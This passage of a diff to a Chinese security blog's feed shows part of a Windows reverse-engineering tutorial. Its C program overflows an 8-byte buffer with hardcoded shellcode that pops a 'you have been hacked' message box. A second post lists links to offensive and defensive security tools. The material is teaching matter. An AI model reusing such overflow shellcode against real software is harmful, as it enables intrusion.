-<h4 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;stdio.h&quot;</div><div class="line">#include &quot;string.h&quot;</div><div class="line"></div><div class="line">char name[] = &quot;\x41\x41\x41\x41\x41\x41\x41\x41&quot;</div><div class="line">              &quot;\x41\x41\x41\x41&quot;   //ebp</div><div class="line">			  &quot;\xb3\xa0\xf6\x75&quot;   //Return address \xb3\xa0\x20\x76</div><div class="line">			  &quot;\x83\xEC\x50&quot;</div><div class="line">			  &quot;\x33\xDB&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\x68\x69\x6E\x67\x20&quot;</div><div class="line">			  &quot;\x68\x57\x61\x72\x6E&quot;</div><div class="line">			  &quot;\x8B\xC4&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\x68\x21\x20\x20\x20&quot;</div><div class="line">			  &quot;\x68\x4D\x30\x72\x6B&quot;</div><div class="line">			  &quot;\x68\x20\x62\x79\x20&quot;</div><div class="line">			  &quot;\x68\x63\x6B\x65\x64&quot;</div><div class="line">			  &quot;\x68\x6E\x20\x68\x61&quot;</div><div class="line">			  &quot;\x68\x20\x62\x65\x65&quot;</div><div class="line">			  &quot;\x68\x68\x61\x76\x65&quot;</div><div class="line">			  &quot;\x68\x79\x6F\x75\x20&quot;</div><div class="line">			  &quot;\x8B\xCC&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\x50&quot;</div><div class="line">			  &quot;\x51&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\xB8\x99\xEA\xF0\x75&quot;</div><div class="line">			  &quot;\xFF\xD0&quot;</div><div class="line">			  &quot;\x53&quot;</div><div class="line">			  &quot;\xB8\x52\xBE\xC0\x76&quot;</div><div class="line">			  &quot;\xFF\xD0&quot;;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char buffer[8];</div><div class="line">	LoadLibrary(&quot;user32.dll&quot;);</div><div class="line">	strcpy(buffer,name);</div><div class="line">	printf(&quot;%s\n&quot;,buffer);</div><div class="line">	getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><img src="/2017/08/02/windows逆向入门/1.png" alt=""></p>
-<h4 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h4><ul>
-<li><a href="http://bbs.pediy.com/search-_E5_8E_9F_E5_88_9B_5DOllyDBG_20_E5_85_A5_E9_97_A8_E7_B3_BB_E5_88_97.htm" target="_blank" rel="external">OllyDBG 入门系列</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;概念知识点&quot;&gt;&lt;a href=&quot;#概念知识点&quot; class=&quot;headerlink&quot; title=&quot;概念知识点&quot;&gt;&lt;/a&gt;概念知识点&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;在程序执行的过程中，cpu会不断处理数据，而cpu处理的数据通常来自3个地方&lt;br&gt;1.数据在指令中直接
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>20170802安全动态</title>
-    <link href="http://kevien.github.io/2017/08/02/20170802%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
-    <id>http://kevien.github.io/2017/08/02/20170802安全动态/</id>
-    <published>2017-08-02T01:21:26.000Z</published>
-    <updated>2017-08-02T14:48:14.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
-<li>使用Frida从TeamViewer内存中提取密码<br><a href="https://github.com/vah13/extractTVpasswords" target="_blank" rel="external">https://github.com/vah13/extractTVpasswords</a></li>
-<li>通过使用Burp和Sqlmap Tamper利用二次注入漏洞<br><a href="https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/" target="_blank" rel="external">https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/</a></li>
-<li>WiFiBeat:将802.11 frames存储在Elasticsearch中，并通过Kibana可视化<br><a href="https://www.wifibeat.org/#" target="_blank" rel="external">https://www.wifibeat.org/#</a></li>
-<li>WMIMon：Windows平台监控WMI活动的命令行工具<br><a href="https://github.com/luctalpe/WMIMon" target="_blank" rel="external">https://github.com/luctalpe/WMIMon</a></li>
-<li>命令注入漏洞测试方法谈<br><a href="https://www.hackerone.com/blog/how-to-command-injections" target="_blank" rel="external">https://www.hackerone.com/blog/how-to-command-injections</a></li>
-<li>SQLMap Web GUI<br><a href="https://n0where.net/sqlmap-web-gui/" target="_blank" rel="external">https://n0where.net/sqlmap-web-gui/</a><br><a href="https://github.com/Hood3dRob1n/SQLMAP-Web-GUI" target="_blank" rel="external">https://github.com/Hood3dRob1n/SQLMAP-Web-GUI</a></li>
-<li>破坏认证和会话管理 – Session Fixation<br><a href="https://www.peerlyst.com/posts/broken-authentication-and-session-management-session-fixation-hari-charan" target="_blank" rel="external">https://www.peerlyst.com/posts/broken-authentication-and-session-management-session-fixation-hari-charan</a></li>
-<li>Hyper-V debugging for beginners - Hyper-V 调试入门<br><a href="http://hvinternals.blogspot.com/2015/10/hyper-v-debugging-for-beginners.html" target="_blank" rel="external">http://hvinternals.blogspot.com/2015/10/hyper-v-debugging-for-beginners.html</a></li>
-<li>wtfjs - JavaScript 的一些有趣的小技巧(Tricks)总结<br><a href="https://github.com/denysdovhan/wtfjs" target="_blank" rel="external">https://github.com/denysdovhan/wtfjs</a></li>
-<li>macOS 系统软件升级器（Updater）和安装器（Installer）漏洞所引入的提权问题，包括系统自带的也包括一些第三方软件提供的，来自 DEFCON 会议的演讲<br><a href="https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken" target="_blank" rel="external">https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken</a></li>
-<li>如何不调用PowerShell.exe获得Empire agent<br><a href="http://bobao.360.cn/learning/detail/4187.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4187.html</a></li>
-<li>FFmpeg任意文件读取漏洞分析<br><a href="http://www.freebuf.com/column/142775.html" target="_blank" rel="external">http://www.freebuf.com/column/142775.html</a></li>
-<li>mac下解压7z压缩文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">brew search 7z</div><div class="line">brew install p7zip</div><div class="line">安装完成之后 7z e compressed.7z </div><div class="line">默认是解压到当前文件夹下的，所以最好建一个单独的文件夹去解压。</div></pre></td></tr></table></figure>
-</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;使用Frida从TeamViewer内存中提取密码&lt;br&gt;&lt;a href=&quot;https://gi
     
     </summary>
     
